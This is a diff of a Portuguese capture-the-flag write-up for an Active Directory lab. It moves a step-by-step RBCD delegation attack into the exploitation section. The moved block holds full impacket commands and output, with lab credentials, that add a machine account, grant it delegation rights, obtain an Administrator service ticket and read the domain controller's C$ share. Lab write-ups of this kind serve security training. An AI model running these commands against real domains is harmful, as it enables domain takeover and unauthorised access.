@@ -664,85 +664,8 @@ Irei ver se consigo complementar o resultado do j.smith com o t.jones e achar ma
 Essa fase será a fase que como r.williams eu irei executar o vetor de ataque via AddAllowedToAct para conseguir ser administrator.
 
 Iremos usar um ataque que chama rbcd , na qual a gente tem permissao de AddAllowedToAct no host que é o DC01.CTF.LOCAL e com isso iremos adicionar uma conta de computador a esse host , pois nosso usuário tem permissão de editar uma lista de controle que diz quais contas/computadores podem solicitar bilhetes TGS em meu nome para fingir ser qualquer outro usuário? basicamente o DC01 que pode solicitar TGS mas aí no caso iremos editar essa lista e iremos criar uma conta de computador que iremos inserir ela na lista e com ela iremos pedir tgs e impersonar como admin já que ele não é tratado como user protegido e pode ser delegado.
+Passo a passo na seção exploração.
 
-Primeiro passo criamos a conta de computador
-```
-impacket-addcomputer 'ctf.local/r.williams:Helpdesk01!' -dc-ip 10.65.146.61 -computer-name "TESTECOMP$" -computer-pass 'SenhaSegura123!'
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Successfully added machine account TESTECOMP$ with password SenhaSegura123!.
-```
-Com essa conta iremos usar um outro script do impacket que permite que faça o rbcd com write escrevendo na lista DACL que dita os computadores que podem se passar pelo DC01.
-```
-impacket-rbcd -dc-ip 10.65.146.61 -action write -delegate-to 'DC01$' -delegate-from 'TESTECOMP$' 'ctf.local/r.williams:Helpdesk01!'
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
-[*] Delegation rights modified successfully!
-[*] TESTECOMP$ can now impersonate users on DC01$ via S4U2Proxy
-[*] Accounts allowed to act on behalf of other identity:
-[*]     TESTECOMP$   (S-1-5-21-1966530601-3185510712-10604624-3109)
-```
-Assim tendo editado agora podemos simplesmente usar o script do impacket que permite que peçamos o ticket de serviço como admin e recuperemos o TGT , mas usando a conta de computador que criamos.
-```
-impacket-getST -impersonate Administrator -spn cifs/DC01.ctf.local 'ctf.local/TESTECOMP$:SenhaSegura123!' -dc-ip 10.65.146.61
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[-] CCache file is not found. Skipping...
-[*] Getting TGT for user
-[*] Impersonating Administrator
-[*] Requesting S4U2self
-[*] Requesting S4U2Proxy
-[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
-```
-Aqui fizemos esse processo e guardamos o TGS no arquivo .cache , iremos agora exportar.
-```
-export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
-```
-Exportamos ele pro env e agora iremos acessar o C$ como admin com o ticket .
-```
-impacket-smbclient -k -no-pass DC01.ctf.local 
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-Type help for list of commands
-# shares
-ADMIN$
-C$
-Downloads
-IPC$
-NETLOGON
-SYSVOL
-# use C$
-# ls
-...
-drw-rw-rw-          0  Thu Sep 17 16:30:39 2026 Users
-drw-rw-rw-          0  Wed May 20 11:07:51 2026 Windows
-# cd Users
-# ls
-drw-rw-rw-          0  Thu Sep 17 16:30:39 2026 .
-drw-rw-rw-          0  Thu Sep 17 16:30:39 2026 ..
-drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 Administrator
-...
-# cd Administrator
-# ls
-drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 .
-drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 ..
-drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 3D Objects
-drw-rw-rw-          0  Wed Mar 17 11:00:03 2021 AppData
-drw-rw-rw-          0  Wed Mar 17 11:00:03 2021 Application Data
-drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 Contacts
-drw-rw-rw-          0  Wed Mar 17 11:00:03 2021 Cookies
-drw-rw-rw-          0  Wed May 20 11:21:12 2026 Desktop
-...
-# cd Desktop
-# ls
-drw-rw-rw-          0  Wed May 20 11:21:12 2026 .
-drw-rw-rw-          0  Wed May 20 11:21:12 2026 ..
--rw-rw-rw-        282  Wed Mar 17 11:13:27 2021 desktop.ini
--rw-rw-rw-         37  Thu Sep 17 13:34:39 2026 flag.txt
-# cat flag.txt
-THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}
-```
 ### Enumeração manual via RDP (j.smith)
 Como vimos no enum4linux o j.smith participa do grupo Remote Desktop Users que induz a entendermos que podemos usar o rdp para fazer login com suas credenciais no domínio, assim iremos acessar via RDP e enumerar manualmente.
 ```
@@ -1220,6 +1143,87 @@ User claims unknown.
 > **Parâmetro Vulnerável:** Marked Sensitive em admin como false , além da permissão para r.williams editar o DACL de contas de usuários/computadores que podem se passar pelo DC01 para solicitar tickets de serviço
 > **Tipo:** Ataque RBCD
 > **Mecanismo:** Uso de scripts impacket para adicionar computador , delegar autroridade para o computador criado para se passar pelo DC01 para pedir tickets e solicitar ticket de serviço se impersonando como admin utilizando a conta de computador criada e assim guardando o TGS localmente em arquivo .cache para utilização.
+
+Passo a passo:
+
+Primeiro passo criamos a conta de computador
+```
+impacket-addcomputer 'ctf.local/r.williams:Helpdesk01!' -dc-ip 10.65.146.61 -computer-name "TESTECOMP$" -computer-pass 'SenhaSegura123!'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully added machine account TESTECOMP$ with password SenhaSegura123!.
+```
+Com essa conta iremos usar um outro script do impacket que permite que faça o rbcd com write escrevendo na lista DACL que dita os computadores que podem se passar pelo DC01.
+```
+impacket-rbcd -dc-ip 10.65.146.61 -action write -delegate-to 'DC01$' -delegate-from 'TESTECOMP$' 'ctf.local/r.williams:Helpdesk01!'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] TESTECOMP$ can now impersonate users on DC01$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     TESTECOMP$   (S-1-5-21-1966530601-3185510712-10604624-3109)
+```
+Assim tendo editado agora podemos simplesmente usar o script do impacket que permite que peçamos o ticket de serviço como admin e recuperemos o TGT , mas usando a conta de computador que criamos.
+```
+impacket-getST -impersonate Administrator -spn cifs/DC01.ctf.local 'ctf.local/TESTECOMP$:SenhaSegura123!' -dc-ip 10.65.146.61
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
+```
+Aqui fizemos esse processo e guardamos o TGS no arquivo .cache , iremos agora exportar.
+```
+export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
+```
+Exportamos ele pro env e agora iremos acessar o C$ como admin com o ticket .
+```
+impacket-smbclient -k -no-pass DC01.ctf.local 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+Downloads
+IPC$
+NETLOGON
+SYSVOL
+# use C$
+# ls
+...
+drw-rw-rw-          0  Thu Sep 17 16:30:39 2026 Users
+drw-rw-rw-          0  Wed May 20 11:07:51 2026 Windows
+# cd Users
+# ls
+drw-rw-rw-          0  Thu Sep 17 16:30:39 2026 .
+drw-rw-rw-          0  Thu Sep 17 16:30:39 2026 ..
+drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 Administrator
+...
+# cd Administrator
+# ls
+drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 .
+drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 ..
+drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 3D Objects
+drw-rw-rw-          0  Wed Mar 17 11:00:03 2021 AppData
+drw-rw-rw-          0  Wed Mar 17 11:00:03 2021 Application Data
+drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 Contacts
+drw-rw-rw-          0  Wed Mar 17 11:00:03 2021 Cookies
+drw-rw-rw-          0  Wed May 20 11:21:12 2026 Desktop
+...
+# cd Desktop
+# ls
+drw-rw-rw-          0  Wed May 20 11:21:12 2026 .
+drw-rw-rw-          0  Wed May 20 11:21:12 2026 ..
+-rw-rw-rw-        282  Wed Mar 17 11:13:27 2021 desktop.ini
+-rw-rw-rw-         37  Thu Sep 17 13:34:39 2026 flag.txt
+# cat flag.txt
+THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}
+```
 
 > [!success] Credenciais Obtidas
 > - **Usuários:** t.jones e r.williams
